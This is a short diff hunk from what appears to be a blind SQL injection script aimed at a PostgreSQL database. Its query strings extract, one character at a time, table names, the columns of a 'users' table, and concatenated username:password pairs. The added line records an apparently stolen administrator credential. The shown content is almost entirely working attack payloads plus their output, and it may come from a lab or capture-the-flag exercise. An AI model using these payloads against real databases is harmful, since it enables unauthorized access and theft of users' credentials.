@@ -13,7 +13,7 @@ query = "(SELECT+ascii(substring(string_agg(tablename,':'),[POS],1))+FROM+pg_cat
 query = "(SELECT+ascii(substring(string_agg(column_name,':'),[POS],1))+FROM+information_schema.columns+where+table_name='users'+LIMIT+1)"
 #username:password
 query = "(SELECT+ascii(substring(string_agg(username||':'||password,','),[POS],1))+FROM+users+LIMIT+1)"
-
+#administrator:tjsg5qx5d5wk8a1sa6ph,ca
 
 def send(query):
     if "[POS]" not in query:
